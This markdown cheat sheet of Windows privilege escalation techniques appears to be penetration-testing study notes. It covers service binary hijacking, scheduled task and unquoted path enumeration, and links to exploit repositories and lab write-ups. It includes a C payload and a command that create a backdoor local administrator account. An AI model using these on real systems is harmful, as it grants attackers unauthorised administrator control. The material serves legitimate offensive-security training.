## Unusual Privilege

- General list - https://github.com/gtworek/Priv2Admin
- SeRestorePrivilege - https://www.hackingarticles.in/windows-privilege-escalation-serestoreprivilege/
- SeManageVolumeExploit - https://github.com/CsEnox/SeManageVolumeExploit
## Binary Hijacking
- Permissions
```
icacls C:\Folder
```
- add user binary
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
- Stop/start/information

```
sc stop <ServiceName>
sc start <ServiceName>
sc qc <ServiceName>
```
- Adding user to admin group
```
net localgroup administrators "UserName" /add
```

## Scheduled Task

- List all scheduled tasks
```
schtasks
```
- Detailed list
```
schtasks /query /fo LIST /v
```
- Check specific task
```
schtasks /query /tn "TaskName"
```
## Unquoted space in path
- Order
```
C:\Program.exe

C:\Program Files\My.exe

C:\Program Files\My Program\My.exe

C:\Program Files\My Program\My service\service.exe
```
## PG practice
- FullPowers to get back service account removed privileges - [Access](https://medium.com/@Dpsypher/proving-grounds-practice-access-b95d3146cfe9)
- `SeManageVolumePrivilege` Privilege escalation chain (C drive access, then manual DLL hijacking) - [Exploit](https://github.com/CsEnox/SeManageVolumeExploit/tree/public), [Access](https://medium.com/@Dpsypher/proving-grounds-practice-access-b95d3146cfe9)
- No interactive shell to type password - RunasCs
- `SeRestorePrivilege` abuse with Utilman - [Heist](https://infosecwriteups.com/proving-grounds-practice-heist-ed0bef92cc02) , [Exploit]()
